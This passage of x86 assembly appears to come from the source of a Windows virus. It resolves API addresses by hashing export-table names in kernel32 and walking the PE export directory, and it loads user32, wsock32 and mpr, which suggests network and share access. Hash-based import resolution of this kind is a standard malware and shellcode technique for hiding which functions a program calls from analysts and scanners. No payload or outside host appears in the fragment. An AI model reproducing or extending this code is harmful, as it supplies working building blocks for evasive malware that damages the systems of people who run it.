DEBUGOFF

get_api_addresses:
       pushad

       push ofs kernel32
       mov eax,[GMH]
       call dwo [eax]
       test eax,eax
       xchg eax,ebp
       jz @@error

       mov edi, ofs api_addresses
       mov esi, ofs api_kernel32_crc
       call @@api_loop

       mov eax,ofs user32
       call @@import_shits

       mov eax,ofs wsock32
       call @@import_shits

       mov eax,ofs mpr
       call @@import_shits

       cmp eax,esp
       jne @@error                      ;exit with NZ

  @@import_shits:
       push eax
       call [_LoadLibraryA]
       test eax,eax
       jz @@error2
       mov ebp, eax
  @@api_loop:
       lodsd
       test eax,eax
       jz @@done
       mov edx,eax
       call search_export_table
       stosd
       jmp @@api_loop
  @@done:
       ret

  @@error2:
       pop eax
  @@error:
       popad
       ret

;edx=crc of API we're searching
;ebp=dll base
search_export_table:
;eax=API entrypoint
       pushad

       mov esi, [ebp.MZ_lfanew]
       lea esi, [ebp+esi.NT_OptionalHeader. \
                         OH_DirectoryEntries \
                        .DE_Export \
                        .DD_VirtualAddress]
       mov esi,[esi]
       add esi,ebp

       mov ecx, [esi.ED_NumberOfNames]
       mov eax, [esi.ED_AddressOfNames]

       lea edi, [eax+ebp]                      ;address of names
       sub ebx, ebx                            ;counter

  @@continue:
       push esi
       mov esi, [edi+ebx*4]
       add esi, ebp
       call get_hash                           ;esi=pointer to API name
       cmp eax, edx
       pop esi
       je @@found

       inc ebx                                 ;next name
       dec ecx
       jz @@error

       jmp @@continue

  @@found:
       mov eax, [esi.ED_AddressOfFunctions]
       mov edx, [esi.ED_AddressOfOrdinals]
       add edx, ebp
       add eax, ebp                            ;fix pointers
       movzx edx, wo [edx+ebx*2]
       mov eax, [eax+edx*4]                    ;eax=function address
       add eax, ebp
       mov [esp.Pushad_eax], eax
  @@error:
       popad
       ret

